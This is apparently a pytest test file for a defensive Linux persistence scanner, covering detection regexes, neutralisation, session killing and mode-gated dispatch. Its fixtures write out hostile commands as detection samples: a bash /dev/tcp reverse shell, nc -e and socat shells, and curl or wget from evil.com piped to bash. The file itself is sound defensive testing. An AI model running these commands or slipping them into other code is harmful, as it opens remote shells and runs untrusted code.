"""Тесты модуля сканирования persistence-механизмов."""

from __future__ import annotations

import asyncio
from unittest.mock import patch

from phantom.response.persistence import (
    PersistenceScanner,
    PersistenceFinding,
    PersistenceScanResult,
    _SUSPICIOUS_PATTERNS,
)


# ---------- PersistenceFinding ----------

def test_finding_to_dict():
    f = PersistenceFinding(
        category="cron",
        severity="high",
        path="/etc/cron.d/evil",
        detail="* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        user="attacker",
        neutralized=True,
        neutralize_detail="Renamed to evil.phantom_disabled",
    )
    d = f.to_dict()
    assert d["category"] == "cron"
    assert d["severity"] == "high"
    assert d["neutralized"] is True
    assert "evil" in d["path"]


def test_scan_result_to_dict():
    r = PersistenceScanResult(
        findings=[
            PersistenceFinding("cron", "high", "/tmp/x", "detail", "user1"),
        ],
        scanned_at="2026-01-01T00:00:00Z",
        target_uid=1000,
        target_user="attacker",
        sessions_killed=2,
        scan_duration_seconds=1.5,
    )
    d = r.to_dict()
    assert d["findings_count"] == 1
    assert d["target_uid"] == 1000
    assert d["sessions_killed"] == 2


# ---------- Suspicious patterns ----------

def test_suspicious_patterns_detect_reverse_shell():
    assert _SUSPICIOUS_PATTERNS.search("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert _SUSPICIOUS_PATTERNS.search("nc -e /bin/bash 10.0.0.1 4444")
    assert _SUSPICIOUS_PATTERNS.search("ncat 10.0.0.1 4444")
    assert _SUSPICIOUS_PATTERNS.search("curl http://evil.com/s.sh | bash")
    assert _SUSPICIOUS_PATTERNS.search("wget http://evil.com/s.sh | sh")
    assert _SUSPICIOUS_PATTERNS.search("python -c 'import socket'")
    assert _SUSPICIOUS_PATTERNS.search("perl -e 'use socket'")
    assert _SUSPICIOUS_PATTERNS.search("socat tcp:10.0.0.1:4444")
    assert _SUSPICIOUS_PATTERNS.search("chmod u+s /tmp/suid")
    assert _SUSPICIOUS_PATTERNS.search("echo payload | base64 -d | bash")


def test_suspicious_patterns_no_false_positive():
    assert not _SUSPICIOUS_PATTERNS.search("echo hello world")
    assert not _SUSPICIOUS_PATTERNS.search("ls -la /tmp")
    assert not _SUSPICIOUS_PATTERNS.search("apt-get update")


# ---------- PersistenceScanner ----------

def test_scan_unknown_pid():
    """Сканирование несуществующего PID возвращает пустой результат."""
    scanner = PersistenceScanner()

    async def _run():
        with patch.object(scanner, "_resolve_user", return_value=(None, None)):
            return await scanner.scan(pid=99999)

    result = asyncio.run(_run())
    assert result.target_uid is None
    assert len(result.findings) == 0


def test_scan_runs_all_categories():
    """Проверяем что scan вызывает все категории сканеров."""
    scanner = PersistenceScanner()

    async def _run():
        with patch.object(scanner, "_resolve_user", return_value=(1000, "testuser")), \
             patch.object(scanner, "_scan_cron", return_value=[]) as m_cron, \
             patch.object(scanner, "_scan_ssh_keys", return_value=[]) as m_ssh, \
             patch.object(scanner, "_scan_systemd_units", return_value=[]) as m_systemd, \
             patch.object(scanner, "_scan_shell_rc", return_value=[]) as m_rc, \
             patch.object(scanner, "_scan_at_jobs", return_value=[]) as m_at, \
             patch.object(scanner, "_scan_active_sessions", return_value=[]) as m_sessions:

            result = await scanner.scan(pid=1234)

        assert result.target_uid == 1000
        assert result.target_user == "testuser"
        m_cron.assert_called_once()
        m_ssh.assert_called_once()
        m_systemd.assert_called_once()
        m_rc.assert_called_once()
        m_at.assert_called_once()
        m_sessions.assert_called_once()

    asyncio.run(_run())


def test_scan_with_findings():
    """Сканирование с найденными механизмами закрепления."""
    scanner = PersistenceScanner()
    findings = [
        PersistenceFinding("cron", "high", "/etc/cron.d/evil", "reverse shell", "attacker"),
        PersistenceFinding("ssh_key", "high", "/home/attacker/.ssh/authorized_keys", "key", "attacker"),
    ]

    async def _run():
        with patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")), \
             patch.object(scanner, "_scan_cron", return_value=[findings[0]]), \
             patch.object(scanner, "_scan_ssh_keys", return_value=[findings[1]]), \
             patch.object(scanner, "_scan_systemd_units", return_value=[]), \
             patch.object(scanner, "_scan_shell_rc", return_value=[]), \
             patch.object(scanner, "_scan_at_jobs", return_value=[]), \
             patch.object(scanner, "_scan_active_sessions", return_value=[]):

            return await scanner.scan(pid=1234)

    result = asyncio.run(_run())
    assert len(result.findings) == 2
    assert result.findings[0].category == "cron"
    assert result.findings[1].category == "ssh_key"


def test_scan_with_neutralize():
    """Нейтрализация вызывается при neutralize=True."""
    scanner = PersistenceScanner()
    finding = PersistenceFinding("cron", "high", "crontab -u attacker", "nc ...", "attacker")

    async def _run():
        with patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")), \
             patch.object(scanner, "_scan_cron", return_value=[finding]), \
             patch.object(scanner, "_scan_ssh_keys", return_value=[]), \
             patch.object(scanner, "_scan_systemd_units", return_value=[]), \
             patch.object(scanner, "_scan_shell_rc", return_value=[]), \
             patch.object(scanner, "_scan_at_jobs", return_value=[]), \
             patch.object(scanner, "_scan_active_sessions", return_value=[]), \
             patch.object(scanner, "_neutralize", return_value=0) as m_neutralize:

            await scanner.scan(pid=1234, neutralize=True)
        m_neutralize.assert_called_once()

    asyncio.run(_run())


def test_kill_user_sessions_unknown_pid():
    """kill_user_sessions для несуществующего PID возвращает 0."""
    scanner = PersistenceScanner()

    async def _run():
        with patch.object(scanner, "_resolve_user", return_value=(None, None)):
            return await scanner.kill_user_sessions(pid=99999)

    killed = asyncio.run(_run())
    assert killed == 0


def test_kill_user_sessions_calls_kill():
    """kill_user_sessions вызывает _kill_sessions."""
    scanner = PersistenceScanner()

    async def _run():
        with patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")), \
             patch.object(scanner, "_kill_sessions", return_value=1) as m_kill:
            killed = await scanner.kill_user_sessions(pid=1234)
        assert killed == 1
        m_kill.assert_called_once_with("attacker")

    asyncio.run(_run())


def test_kill_sessions_refuses_root():
    """_kill_sessions отказывается убивать сессии root."""
    scanner = PersistenceScanner()
    assert scanner._kill_sessions("root") == 0


def test_kill_sessions_refuses_empty():
    """_kill_sessions отказывается для пустого username."""
    scanner = PersistenceScanner()
    assert scanner._kill_sessions("") == 0


# ---------- Dispatcher integration ----------

def test_dispatcher_has_persistence_handlers():
    """Dispatcher содержит обработчики для SCAN_PERSISTENCE и KILL_USER_SESSIONS."""
    from phantom.response.dispatcher import Dispatcher
    from phantom.core.state import ResponseAction

    d = Dispatcher()
    assert ResponseAction.SCAN_PERSISTENCE in d._handlers
    assert ResponseAction.KILL_USER_SESSIONS in d._handlers


def test_dispatcher_scan_persistence_blocked_in_dry_run():
    """SCAN_PERSISTENCE блокируется в dry_run режиме."""
    from phantom.response.dispatcher import Dispatcher
    from phantom.core.state import (
        Context, Decision, Event, EventType, ResponseAction, RunMode, Severity,
    )

    d = Dispatcher()
    event = Event(
        event_type=EventType.FILE_ACCESS,
        target_path="/etc/shadow.bak",
        process_pid=1234,
        severity=Severity.HIGH,
    )
    ctx = Context(event=event, threat_score=0.9)
    decision = Decision.from_context(
        context=ctx,
        actions=(ResponseAction.SCAN_PERSISTENCE,),
        mode=RunMode.DRY_RUN,
    )

    async def _run():
        return await d._scan_persistence(decision)

    result = asyncio.run(_run())
    assert result.success is True
    assert result.message == "blocked_by_mode"


def test_dispatcher_kill_sessions_blocked_in_observation():
    """KILL_USER_SESSIONS блокируется в observation режиме."""
    from phantom.response.dispatcher import Dispatcher
    from phantom.core.state import (
        Context, Decision, Event, EventType, ResponseAction, RunMode, Severity,
    )

    d = Dispatcher()
    event = Event(
        event_type=EventType.FILE_ACCESS,
        target_path="/etc/shadow.bak",
        process_pid=1234,
        severity=Severity.HIGH,
    )
    ctx = Context(event=event, threat_score=0.9)
    decision = Decision.from_context(
        context=ctx,
        actions=(ResponseAction.KILL_USER_SESSIONS,),
        mode=RunMode.OBSERVATION,
    )

    async def _run():
        return await d._kill_user_sessions(decision)

    result = asyncio.run(_run())
    assert result.success is True
    assert result.message == "blocked_by_mode"


def test_dispatcher_scan_persistence_no_pid():
    """SCAN_PERSISTENCE без PID возвращает ошибку."""
    from phantom.response.dispatcher import Dispatcher
    from phantom.core.state import (
        Context, Decision, Event, EventType, ResponseAction, RunMode, Severity,
    )

    d = Dispatcher()
    event = Event(
        event_type=EventType.FILE_ACCESS,
        target_path="/etc/shadow.bak",
        severity=Severity.HIGH,
    )
    ctx = Context(event=event, threat_score=0.9)
    decision = Decision.from_context(
        context=ctx,
        actions=(ResponseAction.SCAN_PERSISTENCE,),
        mode=RunMode.ACTIVE,
    )

    async def _run():
        return await d._scan_persistence(decision)

    result = asyncio.run(_run())
    assert result.success is False
    assert result.message == "no_pid"


# ---------- Orchestrator integration ----------

def test_orchestrator_active_mode_includes_persistence():
    """DecisionEngine в active mode добавляет SCAN_PERSISTENCE и KILL_USER_SESSIONS."""
    from phantom.core.orchestrator import DecisionEngine, OrchestratorConfig
    from phantom.core.state import (
        Context, Event, EventType, ResponseAction, RunMode, Severity,
    )

    cfg = OrchestratorConfig(mode=RunMode.ACTIVE)
    engine = DecisionEngine(cfg)
    event = Event(
        event_type=EventType.FILE_ACCESS,
        target_path="/tmp/trap.pem",
        process_pid=1234,
        severity=Severity.HIGH,
        trap_id="trap-001",
    )
    ctx = Context(event=event, threat_score=0.95)
    decision = engine.decide(ctx)

    assert ResponseAction.SCAN_PERSISTENCE in decision.actions
    assert ResponseAction.KILL_USER_SESSIONS in decision.actions
    actions_list = list(decision.actions)
    kill_idx = actions_list.index(ResponseAction.KILL_PROCESS)
    scan_idx = actions_list.index(ResponseAction.SCAN_PERSISTENCE)
    sessions_idx = actions_list.index(ResponseAction.KILL_USER_SESSIONS)
    assert scan_idx > kill_idx
    assert sessions_idx > scan_idx


def test_orchestrator_observation_mode_no_persistence():
    """DecisionEngine в observation mode не добавляет persistence actions."""
    from phantom.core.orchestrator import DecisionEngine, OrchestratorConfig
    from phantom.core.state import (
        Context, Event, EventType, ResponseAction, RunMode, Severity,
    )

    cfg = OrchestratorConfig(mode=RunMode.OBSERVATION)
    engine = DecisionEngine(cfg)
    event = Event(
        event_type=EventType.FILE_ACCESS,
        target_path="/tmp/trap.pem",
        process_pid=1234,
        severity=Severity.HIGH,
    )
    ctx = Context(event=event, threat_score=0.9)
    decision = engine.decide(ctx)

    assert ResponseAction.SCAN_PERSISTENCE not in decision.actions
    assert ResponseAction.KILL_USER_SESSIONS not in decision.actions
